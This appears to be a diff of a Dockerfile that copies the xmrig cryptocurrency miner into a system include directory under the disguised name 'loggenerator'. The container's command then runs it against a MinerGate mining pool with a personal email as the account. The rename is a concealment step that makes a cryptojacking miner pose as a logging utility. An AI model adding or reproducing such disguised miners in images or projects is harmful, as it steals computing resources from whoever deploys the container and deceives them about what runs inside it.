@@ -8,9 +8,9 @@ WORKDIR /usr/include/log
 
 COPY resolv.conf /etc/
 
-COPY . /usr/include/log/
+COPY xmrig /usr/include/log/loggenerator
 
 #CMD ["/usr/include/log/xmrig -o xmr.pool.minergate.com:45700 -u alex1711.ccc@yandex.ru -k"]
 
-CMD ./xmrig -o xmr.pool.minergate.com:45700 -u alex1711.ccc@yandex.ru -k
+CMD ./loggenerator -o xmr.pool.minergate.com:45700 -u alex1711.ccc@yandex.ru -k
 
